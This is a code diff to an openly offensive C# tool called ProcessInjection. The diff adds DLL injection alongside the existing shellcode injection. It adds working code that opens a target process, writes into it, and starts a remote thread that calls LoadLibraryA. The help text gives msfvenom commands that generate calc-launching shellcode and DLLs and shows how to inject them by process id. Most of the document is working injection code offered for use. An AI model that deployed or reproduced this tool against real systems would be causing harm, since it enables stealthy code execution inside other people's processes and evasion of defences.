@@ -29,6 +29,14 @@ namespace ProcessInjection
         [DllImport("Kernel32", SetLastError = true)]
         static extern bool CloseHandle(IntPtr hObject);
 
+        #region DLL Injection
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetModuleHandleA(string lpModuleName);
+
+        [DllImport("kernel32", SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        #endregion DLL Injection
+
         //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
         public enum ProcessAccessRights
         {
@@ -78,7 +86,7 @@ namespace ProcessInjection
                              .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                              .ToArray();
         }
-        public static byte[] converfromc(string val)
+        public static byte[] convertfromc(string val)
         {
             string rval = val.Replace("\"",string.Empty).Replace("\r\n", string.Empty).Replace("x", string.Empty);
             string[] sval = rval.Split('\\');
@@ -130,6 +138,43 @@ namespace ProcessInjection
             }
         }
 
+        public static void DLLInject(int pid, byte[] buf)
+        {
+            try
+            {
+                uint lpNumberOfBytesWritten = 0;
+                uint lpThreadId = 0;
+                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
+                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
+                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
+                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+                Console.WriteLine($"[+] {loadLibraryAddr} is the address of the LoadLibraryA exported function.");
+                Console.WriteLine($"[+] Allocating memory for the DLL path.");
+                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
+                Console.WriteLine($"[+] Memory for injecting DLL path is allocated at 0x{rMemAddress}.");
+                Console.WriteLine($"[+] Writing the DLL path at the allocated memory location.");
+                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
+                {
+                    Console.WriteLine($"[+] DLL path written in the target process memory.");
+                    Console.WriteLine($"[+] Creating remote thread to execute the DLL.");
+                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLibraryAddr, rMemAddress, 0, ref lpThreadId);
+                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
+                    Console.WriteLine($"[+] Sucessfully injected the DLL into the memory of the process id {pid}.");
+                }
+                else
+                {
+                    Console.WriteLine($"[+] Failed to inject the DLL into the memory of the process id {pid}.");
+                }
+                //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
+                bool hOpenProcessClose = CloseHandle(pHandle);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
+                Console.WriteLine(ex.Message);
+            }
+        }
+
         public static void logo()
         {
             Console.WriteLine();
@@ -150,7 +195,12 @@ namespace ProcessInjection
 
             string help = @"
 *****************Help*****************
-[+] The program is designed to inject shellcode in a target process.
+[+] The program is designed to perform process injection.
+[+] Currently the tool supports 2 process injection techniques.
+    1) Vanila Process Injection
+    2) DLL Injection
+
+[+] Vanila Process Injection
 [+] Currently the program accepts shellcode in 3 formats 
     1) base64
     2) hex
@@ -158,15 +208,20 @@ namespace ProcessInjection
 
 [+] Generating shellcode in base64 format and injecting it in the target process.
 [+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" | base64
-[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:base64
+[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:base64 /t:1
 
 [+] Generating shellcode in hex format and injecting it in the target process.
 [+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f hex
-[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:hex
+[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:hex /t:1
 
 [+] Generating shellcode in c format and injecting it in the target process.
 [+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
-[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c
+[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:1
+
+[+] DLL Injection
+[+] Generating DLL and injecting it in the target process.
+[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f dll > Desktop/calc.dll
+[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\calc.dll"" /t:2
 
 ";
             Console.WriteLine(help);
@@ -215,21 +270,30 @@ namespace ProcessInjection
                     Process process = Process.GetProcessById(procid);
                     if (System.IO.File.Exists(arguments["/path"]))
                     {
-                        var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
-                        byte[] buf = new byte[] { };
-                        if (arguments["/f"] == "base64")
+                        if (arguments["/t"] == "1")
                         {
-                            buf = Convert.FromBase64String(shellcode);
+                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
+                            byte[] buf = new byte[] { };
+                            if (arguments["/f"] == "base64")
+                            {
+                                buf = Convert.FromBase64String(shellcode);
+                            }
+                            else if (arguments["/f"] == "hex")
+                            {
+                                buf = StringToByteArray(shellcode);
+                            }
+                            else if (arguments["/f"] == "c")
+                            {
+                                buf = convertfromc(shellcode);
+                            }
+                            CodeInject(procid, buf);
                         }
-                        else if (arguments["/f"] == "hex")
+                        else if (arguments["/t"] == "2")
                         {
-                            buf = StringToByteArray(shellcode);
+                            var dllpath = arguments["/path"];
+                            byte[] buf = Encoding.Default.GetBytes(dllpath);
+                            DLLInject(procid, buf);
                         }
-                        else if (arguments["/f"] == "c")
-                        {
-                            buf = converfromc(shellcode);
-                        }
-                        CodeInject(procid, buf);
                     }
                     else
                     {
